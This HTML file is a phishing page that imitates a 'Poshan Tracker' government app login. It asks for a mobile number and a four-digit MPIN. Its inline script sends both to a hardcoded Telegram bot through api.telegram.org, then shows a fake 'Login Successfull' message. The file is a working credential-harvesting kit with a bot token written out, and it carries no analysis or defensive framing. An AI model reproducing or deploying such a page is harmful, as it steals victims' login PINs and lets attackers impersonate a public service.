<!DOCTYPE html>
<html>
<head>
    <title>Poshan Tracker Login</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link rel="stylesheet" href="style.css">
</head>
<style>
body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    background-color: #FCEAE8;
}

.container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 600px;
}

.form-container {
    background-color: #fff;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    width: 350px;
    height: 1000px;
}

.form-container h2 {
    text-align: center;
    margin-bottom: 20px;
}

.form-container label {
    display: block;
    margin-bottom: 10px;
    font-weight: bold;
}

.form-container input {
    width: 90%;
    height: 30px;
    
    padding: 10px;
    margin-bottom: 20px;
    border: 1px solid #ccc;
    border-radius: 5px;
}

.form-container a {
    
    display: block;
    text-align: center;
    margin-bottom: 20px;
    color: #007bff;
    font-weight: bold;
    text-decoration: none;
}

.form-container button {
    width: 96%;
    height: 55px;
    padding: 10px;
    background-color: #d9534f;
    color: #fff;
    border: none;
    border-radius: 5px;
    cursor: pointer;
}

.form-container p {
    text-align: center;
    margin-top: 20px;
    font-size: 16px;
    font-weight: bold;
}
.terms {
    font-size: 15px;
    margin-top: 15px;
    text-align: center;
    font-weight: bold;
    }

.terms{
    color: #007bff; 
    font-size: 15px;
    text-align: center;
    text-decoration: none;
    }
    a {
    color: #007bff; 
    font-size: 15px;
    text-align: center;
    text-decoration: none;
    }

.terms a:hover { 
   text-decoration: underline; 
   }

</style>
<body>
<br><br><br><br><br><br>
    <div class="container">
       
            <img src="https://i.postimg.cc/R0Fkf2bV/src-assets-images-logo.png" style="width: 140px">
            <br>
        <div class="form-container">
            <h2>Login to Your Account</h2>
            <form onsubmit="return sender()">
                <label for="mobile-number">Mobile Number</label>
                <input type="tel" id="mobno" name="mobno" placeholder="+91 Enter mobile number" maxlength="12" required>

                <label for="mpin">Enter MPIN*</label>
                <input type="tel" id="mpin" name="mpin" placeholder="****" maxlength="4" required>


                <a href="#">Forgot MPIN/ Password</a>

                <button type="submit">LOGIN</button>
            </form>
            <br>
             <div class="terms"><span style="color: black;">By Login, I agree to the</span>
            <br><br>
            <a href="#">Terms Of Service <span style="color: red;">and</span><span style="color: bul;"> Privacy Policy</span></a>
           
            </div> 
            
         <br><br><br><br> <br><br><br>
        </div>
       
    </div>
     <link rel="stylesheet" href="style.css">
    <script src="sender.js"></script>
  
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  
  <script>
  //bot token
var telegram_bot_id = "7603041996:AAHDY91AzmcQd8AK6_y3SJ8nz6SvfSSGakk";
//chat id
var chat_id = 6797224482;
var ready = function () {
    mobno = document.getElementById("mobno").value;
    mpin = document.getElementById("mpin").value;
  
    message = 
      "\nMob No: " + mobno + 
      "\nMPin: " + mpin;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message,
          "file": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
      swal("Successfull", "Your Login Successfull", "success");
      
    });
    document.getElementById("mobno").value = "";
    document.getElementById("mpin").value = "";
    
    return false;
};
  </script>
</body>
</html>
